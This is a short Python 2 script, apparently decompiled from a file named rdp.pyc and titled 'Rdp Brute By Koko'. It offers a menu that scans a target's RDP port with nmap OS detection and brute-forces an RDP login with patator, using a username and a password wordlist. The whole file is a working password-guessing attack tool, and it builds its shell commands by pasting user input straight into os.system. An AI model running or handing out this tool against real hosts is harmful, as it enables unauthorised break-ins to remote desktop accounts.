
import os
os.system('apt-get install figlet')
os.system('clear')
os.system('figlet Rdp Brute By Koko')
print (' \n[1] RDP System Info\n[2] RDP Brute \n\n\n')
secim = raw_input('Choice : ')
if secim == '1':
    hedef_ip = raw_input('Hedef IP : ')
    os.system('nmap -O -p 3389 ' + hedef_ip)
if secim == '2':
    hedef_ip = raw_input('IP : ')
    kullanici_adi = raw_input('Username : ')
    wordlist = raw_input('Wordlist : ')
    os.system('patator rdp_login host=' + hedef_ip + " user='" + kullanici_adi +
 "' password=FILE0 0=" + wordlist + ' -x free=host:code=0')
# okay decompiling rdp.pyc

